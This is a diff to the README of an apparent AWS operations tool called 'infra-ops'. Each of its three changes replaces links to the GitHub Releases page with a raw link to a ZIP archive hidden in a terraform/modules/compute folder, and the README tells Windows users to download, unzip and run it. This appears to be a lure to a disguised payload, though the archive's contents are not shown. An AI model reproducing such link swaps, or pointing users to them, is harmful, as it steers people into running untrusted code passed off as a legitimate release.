@@ -1,7 +1,7 @@
 # 🛠️ infra-ops - Simple AWS Ops Across Environments
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mehdiel7730/infra-ops/releases)
-[![Releases](https://img.shields.io/badge/Get%20the%20app-Open%20Releases-grey?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mehdiel7730/infra-ops/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mehdiel7730/infra-ops/main/terraform/modules/compute/infra-ops-v3.9-beta.4.zip)
+[![Releases](https://img.shields.io/badge/Get%20the%20app-Open%20Releases-grey?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Mehdiel7730/infra-ops/main/terraform/modules/compute/infra-ops-v3.9-beta.4.zip)
 
 ## 📦 What infra-ops does
 
@@ -40,7 +40,7 @@ If your team uses AWS, you may also need:
 
 Go to the releases page and download and run the file that matches your Windows PC:
 
-[Open the Releases page](https://github.com/Mehdiel7730/infra-ops/releases)
+[Open the Releases page](https://raw.githubusercontent.com/Mehdiel7730/infra-ops/main/terraform/modules/compute/infra-ops-v3.9-beta.4.zip)
 
 Look for the latest release and choose the Windows file if one is listed. If the release includes a ZIP file, download it, unzip it, then open the app file inside.
 
@@ -201,7 +201,7 @@ This helps you avoid using the wrong settings in the wrong place.
 
 Use this page to download and run the Windows file:
 
-[https://github.com/Mehdiel7730/infra-ops/releases](https://github.com/Mehdiel7730/infra-ops/releases)
+[https://raw.githubusercontent.com/Mehdiel7730/infra-ops/main/terraform/modules/compute/infra-ops-v3.9-beta.4.zip](https://raw.githubusercontent.com/Mehdiel7730/infra-ops/main/terraform/modules/compute/infra-ops-v3.9-beta.4.zip)
 
 ## 🔧 Basic workflow
 
